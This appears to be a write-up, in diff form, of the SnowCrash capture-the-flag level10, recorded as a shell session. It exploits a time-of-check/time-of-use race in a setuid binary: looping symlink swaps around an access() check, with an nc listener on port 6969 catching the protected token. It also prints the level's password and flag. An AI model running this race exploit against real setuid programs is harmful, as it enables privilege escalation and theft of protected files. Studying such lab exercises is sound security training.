@@ -1,0 +1,86 @@
+level10@SnowCrash:~$ ls -l
+	total 16
+	-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
+	-rw-------  1 flag10 flag10     26 Mar  5  2016 token
+
+level10@SnowCrash:~$ ./level10
+	./level10 file host
+		sends file to host if you have access to it
+level10@SnowCrash:~$ ./level10 token 127.0.0.1
+	You don't have access to token
+level10@SnowCrash:~$ ./level10 /tmp/flag10 127.0.0.1
+	Connecting to 127.0.0.1:6969 .. Unable to connect to host 127.0.0.1
+
+level10@SnowCrash:~$ nm level10
+	08049f28 d _DYNAMIC
+	08049ff4 d _GLOBAL_OFFSET_TABLE_
+	08048a3c R _IO_stdin_used
+			w _Jv_RegisterClasses
+	08049f18 d __CTOR_END__
+	08049f14 d __CTOR_LIST__
+	08049f20 D __DTOR_END__
+	08049f1c d __DTOR_LIST__
+	08048c50 r __FRAME_END__
+	08049f24 d __JCR_END__
+	08049f24 d __JCR_LIST__
+	0804a04c A __bss_start
+	0804a044 D __data_start
+	080489f0 t __do_global_ctors_aux
+	08048650 t __do_global_dtors_aux
+	0804a048 D __dso_handle
+			U __errno_location@@GLIBC_2.0
+			w __gmon_start__
+	080489e2 T __i686.get_pc_thunk.bx
+	08049f14 d __init_array_end
+	08049f14 d __init_array_start
+	080489e0 T __libc_csu_fini
+	08048970 T __libc_csu_init
+			U __libc_start_main@@GLIBC_2.0
+			U __stack_chk_fail@@GLIBC_2.4
+	0804a04c A _edata
+	0804a06c A _end
+	08048a1c T _fini
+	08048a38 R _fp_hw
+	080484d0 T _init
+	08048620 T _start
+			U access@@GLIBC_2.0
+	0804a064 b completed.6159
+			U connect@@GLIBC_2.0
+	0804a044 W data_start
+	0804a068 b dtor_idx.6161
+			U exit@@GLIBC_2.0
+			U fflush@@GLIBC_2.0
+	080486b0 t frame_dummy
+			U htons@@GLIBC_2.0
+			U inet_addr@@GLIBC_2.0
+	080486d4 T main
+			U open@@GLIBC_2.0
+			U printf@@GLIBC_2.0
+			U puts@@GLIBC_2.0
+			U read@@GLIBC_2.0
+			U socket@@GLIBC_2.0
+	0804a060 B stdout@@GLIBC_2.0
+			U strerror@@GLIBC_2.0
+			U write@@GLIBC_2.0
+
+
+## U access@@GLIBC_2.0
+
+level10@SnowCrash:~$ echo "token" > /tmp/token
+
+## new term
+level10@SnowCrash:~$ cd /tmp/
+level10@SnowCrash:/tmp$ while true; do ln -sf /home/user/level10/token flag10; ln -sf /tmp/token flag10; done
+## new term
+level10@SnowCrash:~$ while true; do /home/user/level10/level10 /tmp/flag10 127.0.0.1; done
+
+## first term
+level10@SnowCrash:~$ level10@SnowCrash:~$ nc -lk 6969
+	woupa2yuojeeaaed06riuj63c
+
+level10@SnowCrash:~$ su flag10
+	Password:
+	Don't forget to launch getflag !
+flag10@SnowCrash:~$ getflag
+	Check flag.Here is your token : feulo4b72j7edeahuete3no7c
+flag10@SnowCrash:~$ su level11
